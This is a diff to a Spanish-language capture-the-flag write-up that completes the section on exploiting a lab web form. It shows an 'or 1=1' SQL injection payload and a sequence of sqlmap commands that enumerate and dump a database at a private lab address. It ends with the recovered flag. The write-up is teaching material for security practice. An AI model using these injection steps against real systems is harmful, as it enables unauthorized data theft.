@@ -1,5 +1,5 @@
 # CTF-3
-*Capture the flag* donde se trabaja la enumeración y *fingerprinting*, .
+*Capture the flag* donde se trabaja la enumeración y *fingerprinting*, interacciones con formularios e inyecciones *SQL*.
 <div>
   <img src="https://img.shields.io/badge/-Kali-5e8ca8?style=for-the-badge&logo=kalilinux&logoColor=white" />
   <img src="https://img.shields.io/badge/-Nmap-6933FF?style=for-the-badge&logo=nmap&logoColor=white" />
@@ -71,6 +71,31 @@ Utilizando la sentencia <code>1’ or ‘1’ = ‘1</code> consigo comprobar qu
 
 ![image](https://github.com/user-attachments/assets/409b3355-1c53-4ac5-b877-bbde24a2740a)
 
-**Flag: **
+Demostrado esto, se hace uso de la herramienta **SQLMap** para buscar que tablas contiene la base de datos y encontrar posible información que sea útil en la búsqueda de la flag.
+Se parte de la URL http://10.0.2.15:5000/password.php?id=1 (esta es la dirección a la que se llega cuando indicas en el formulario el ID 1) y se le pasa el parámetro ‘--dbs’ para encontrar las bases de datos contenidas. El parámetro ‘--batch’ se utiliza para que durante la ejecución no esté preguntando por los siguientes pasos a realizar.
 
-**Flag: **
+<code>sqlmap -u "http://10.0.2.15:5000/password.php?id=1" --dbs --batch</code>
+
+![image](https://github.com/user-attachments/assets/a2896bec-aa3f-4bb7-b88e-7a5b77bcb62d)
+
+De entre las bases de datos devueltas, destaca ‘poc’. Así pues, se indica con ‘-D’ la base de datos a analizar y con ‘--tables’, las tablas pertenecientes a ‘poc’.
+
+<code>sqlmap -u "http://10.0.2.15:5000/password.php?id=1" -D poc --tables --batch</code>
+
+![image](https://github.com/user-attachments/assets/c14f5665-5158-4c59-97e5-473e5239933d)
+
+Primero me centro en la tabla ‘flags’ con el parámetro ‘-T’ y compruebo sus campos con el parámetro ‘--columns’.
+
+<code>sqlmap -u "http://10.0.2.15:5000/password.php?id=1" -D poc -T flags --columns --batch</code>
+
+![image](https://github.com/user-attachments/assets/51a5a702-d35c-4c18-99af-ade32ed000c3)
+
+Ya sólo queda recuperar el contenido de la tabla indicando los campos con ‘-C’ y el parámetro ‘-dump’.
+
+<code>sqlmap -u "http://10.0.2.15:5000/password.php?id=1" -D poc -T flags -C flag_number,flag_value -dump --batch</code>
+
+![image](https://github.com/user-attachments/assets/372113d8-4b27-42fb-8442-f82d53b7b273)
+
+Dentro del campo ‘flag_value’ se encuentra la bandera.
+
+**Flag: 003d873449f8e8ff13b72f2061bfbaa4e5a84b82**
